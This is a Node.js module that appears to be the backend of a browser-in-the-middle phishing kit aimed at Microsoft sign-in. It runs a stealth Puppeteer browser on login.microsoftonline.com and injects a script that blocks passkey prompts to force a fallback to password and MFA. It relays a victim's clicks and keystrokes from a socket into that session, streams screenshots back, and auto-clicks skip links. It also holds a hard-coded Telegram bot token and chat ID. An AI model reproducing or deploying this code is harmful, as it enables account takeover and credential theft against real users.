const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const axios = require('axios');

puppeteer.use(StealthPlugin());

const TELEGRAM_TOKEN = '8219244739:AAGqPPCIoujdgeW6NF5xZ2j1dZlDQAa-4pc';
const CHAT_ID = '1318100118';

async function startSession(io, socket) {
    let browser;
    try {
        browser = await puppeteer.launch({
            headless: "new",
            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
        });

        const page = await browser.newPage();

        /**
         * 2026 WEBAUTHN KILL-SWITCH
         * This script runs inside the browser context to block Passkey prompts.
         * It forces Microsoft to fall back to standard MFA/Password.
         */
        await page.evaluateOnNewDocument(() => {
            // 1. Tell Microsoft we don't have a TPM/Windows Hello
            if (window.PublicKeyCredential) {
                PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable = () => Promise.resolve(false);
                PublicKeyCredential.isConditionalMediationAvailable = () => Promise.resolve(false);

                // 2. Intercept and Reject any Passkey creation or login attempt
                const originalGet = window.navigator.credentials.get;
                window.navigator.credentials.get = function(opt) {
                    if (opt && opt.publicKey) {
                        console.log("PASSKEY_ATTEMPT_BLOCKED");
                        // Rejecting with NotAllowedError forces the 'Sign in another way' UI
                        return Promise.reject(new DOMException("The operation was aborted.", "NotAllowedError"));
                    }
                    return originalGet.call(this, opt);
                };
            }
        });

        await page.setViewport({ width: 1280, height: 720 });
        
        // Navigation with a 2026 Mobile User Agent (often bypasses Desktop hardware locks)
        await page.setUserAgent('Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1');
        
        page.goto('https://login.microsoftonline.com/', { waitUntil: 'domcontentloaded' }).catch(() => {});

        const heartbeat = setInterval(async () => {
            if (socket.connected) {
                try {
                    const screenshot = await page.screenshot({ encoding: 'base64', type: 'jpeg', quality: 25 });
                    socket.emit('browser-render', { screenshot });
                } catch (e) {}
            }
        }, 1200);

        // 2026 AUTO-CLICKER FOR FALLBACK LINKS
        const scanner = setInterval(async () => {
            try {
                // Microsoft legacy and 2026 skip/cancel IDs
                const bypassSelectors = ['#iShowSkip', '#idBtn_Back', '.skip-link', 'a[href*="cancel"]', 'button:contains("Not now")'];
                for (const sel of bypassSelectors) {
                    const btn = await page.$(sel);
                    if (btn) await btn.click();
                }
            } catch (e) {}
        }, 3000);

        socket.on('victim-action', async (data) => {
            try {
                if (data.type === 'click') await page.mouse.click(data.x, data.y);
                else if (data.type === 'key') await page.keyboard.press(data.key);
            } catch (e) {}
        });

        socket.on('disconnect', async () => {
            clearInterval(heartbeat);
            clearInterval(scanner);
            if (browser) await browser.close();
        });

    } catch (error) {
        if (browser) await browser.close();
    }
}

module.exports = { startSession };
